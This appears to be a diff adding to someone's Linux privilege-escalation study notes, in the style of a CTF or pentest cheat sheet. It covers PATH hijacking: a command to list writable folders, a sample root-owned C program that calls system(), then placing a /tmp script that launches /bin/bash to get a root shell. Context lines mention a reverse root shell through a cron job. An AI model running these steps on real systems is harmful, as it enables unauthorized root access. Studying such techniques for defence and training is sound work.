@@ -149,4 +149,34 @@ getcap / -r 2>/deev/null
 - Cronjob was deleted but entry not remove from crontab
 - create the deleted file and edit it, and receive a reverse root shell, read what you want, etc
 
+### 6. PATH
+- **PATH** is an env variable that tells the operating system where to search for executables
+- If a folder for which your use has write permission is located in path, you could potentially hijack an application to run a script.
+- For any command not built into the shell, linux will search in folders defined in PATH.
+- Get writable folders using:
+```
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+- e.g.If a program owned by root(e.g. ```
+#include<unistd.h>
+void main(){
+	setuid(0);
+	setgid(0);
+	system("boy");
+	}	```
+cannot find path or program when executed, we can hijack the path or add missing path from where we can add our script:.e.g.
+```
+export PATH=/tmp:$PATH
+```
+- And finally we can hijack the path by adding our script in tmp direcory.e.g.
+```
+echo "/bin/bash" > boy
+chmod 777 boy
+```
+- Thus when the root owned script runs, on failing to find boy in system, it will check in folders in path, and will excute the boy file we created in /tmp and we will gain superuser permissions as root.
+
+
+### 7. NFS
+- 
+
 
